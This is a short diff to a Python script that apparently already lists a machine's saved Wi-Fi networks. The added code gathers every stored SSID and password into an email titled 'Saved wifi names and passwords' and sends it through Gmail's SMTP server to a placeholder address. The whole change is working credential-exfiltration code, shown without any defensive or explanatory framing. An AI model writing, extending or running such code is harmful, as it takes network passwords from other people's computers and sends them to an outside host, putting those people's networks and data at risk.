@@ -42,6 +42,33 @@ if len(wifiNames) != 0:
 for i in range(len(wifiList)):
     print(wifiList[i])
 
+# Import smtplib module to set up email sending
+import smtplib
+from email.message import EmailMessage
+
+# Create the email's message
+emailMessage = ""
+for i in wifiList:
+    emailMessage += f"SSID: {i['ssid']}, Password: {i['password']}\n"
+
+#Create EmailMessage Object
+email = EmailMessage()
+email["from"] = "name_of_sender"
+email["to"] = "email_address"
+
+#Create subject of the email
+email["subject"] = "Saved wifi names and passwords"
+email.set_content(emailMessage)
+
+#Create smtp server
+with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
+    smtp.ehlo()
+    smtp.starttls()
+    smtp.login("login_name", "password")
+    smtp.send_message(email)
+
+
+
 
 
 
